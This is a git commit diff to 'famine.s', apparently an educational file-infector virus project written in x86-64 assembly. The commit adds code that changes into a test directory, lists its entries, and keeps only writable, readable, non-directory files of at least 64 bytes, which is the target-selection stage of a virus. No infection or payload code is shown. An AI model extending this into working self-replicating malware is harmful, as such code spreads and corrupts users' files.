e3e45e0611e0fb08c6d315a05f00c6d1105140b0
Raul Cabezas gonzalez <raul.29cg@gmail.com>
2023-11-27 19:50:57 +0100

    Checking files in tmp/test dir

--- srcs/famine.s
+++ srcs/famine.s
@@ -3,7 +3,9 @@
 %define SYS_CLOSE 3
 %define SYS_STAT 4
 %define SYS_FSTAT 5
+%define SYS_PREAD64 17
 %define SYS_EXIT 60
+%define SYS_CHDIR 80
 %define SYS_GETDENTS64 217
 
 %define S_IFDIR 0x4000
@@ -21,11 +23,19 @@
 ; 	r15 + 80 stat.st_size
 
 ; r15 + 176 struct dirent (sizeof dirent 280)
+; 	r15 + 176 d_ino
+; 	r15 + 176 + 8 d_off
+; 	r15 + 176 + 16 rec_len
+; 	r15 + 176 + 18 d_type
+; 	r15 + 176 + 19 d_name
 
 global _start
 
 	section .text
 _start:
+	S_IRUSR equ 256 ; Owner has read permission
+	S_IWUSR equ 128 ; Owner has write permission
+
 	push rbp
 	push rdx
 	push rsp
@@ -46,7 +56,6 @@ _start:
 
 	mov rdi, r15
 	lea rsi, [r15 + 32]
-
 	mov rax, SYS_STAT
 	syscall
 
@@ -71,6 +80,11 @@ _diropen:
 
 	mov [r15 + 16], rax ; saving  /tmp/test open fd for later
 
+_change_to_dir:
+	lea rdi, [r15]
+	mov rax, SYS_CHDIR
+	syscall
+
 _dirent_tmp_test:
 	mov rdi, [r15 + 16]
 	lea rsi, [r15 + 176]
@@ -86,19 +100,53 @@ _dirent_tmp_test:
 _dirent_loop:
 	movzx r12d, word [r15 + 176 + 16 + r10]
 
-	mov rax, SYS_WRITE
-	mov rdi, 1
-	lea rsi, [r15 + 176 + 19 + r10] ; dirent->name
-	mov rdx, 4
+	; mov rax, SYS_WRITE
+	; mov rdi, 1
+	; lea rsi, [r15 + 176 + 19 + r10] ; dirent->name
+	; mov rdx, 4
+	; syscall
+
+	; mov rax, SYS_WRITE
+	; mov rdi, 1
+	; mov word [r15 + 4000], 10
+	; lea rsi, [r15 + 4000]
+	; mov rdx, 1
+	; syscall
+
+_stat_file:
+	lea rdi, [r15 + 176 + 19 + r10]
+	lea rsi, [r15 + 32]
+	mov rax, SYS_STAT
 	syscall
 
-	mov rax, SYS_WRITE
-	mov rdi, 1
-	mov word [r15 + 4000], 10
-	lea rsi, [r15 + 4000]
-	mov rdx, 1
+_check_file_flags:
+	lea rax, [r15 + 32 + 24]
+	mov rcx, [rax] ;;; rcx & S_IRUSR === 1   ;;;; rcx & S_IWUSR == 1
+	and rcx, S_IRUSR
+	test rcx, rcx
+	jz _continue_dirent
+
+	lea rax, [r15 + 32 + 24]
+	mov rcx, [rax]
+	and rcx, S_IWUSR
+	test rcx, rcx
+	jz _continue_dirent
+
+	lea rax, [r15 + 32 + 24]
+	mov rcx, [rax]
+	mov rdx, S_IFDIR
+	and rcx, S_IFMT
+	cmp rdx, rcx
+	je _continue_dirent ; if failure, exit
+
+	cmp dword [r15 + 80], 64
+	jl _continue_dirent
+
+
+	mov rax, SYS_CLOSE
 	syscall
 
+_continue_dirent:
 	add r10, r12
 	cmp r10, r13
 	jne _dirent_loop
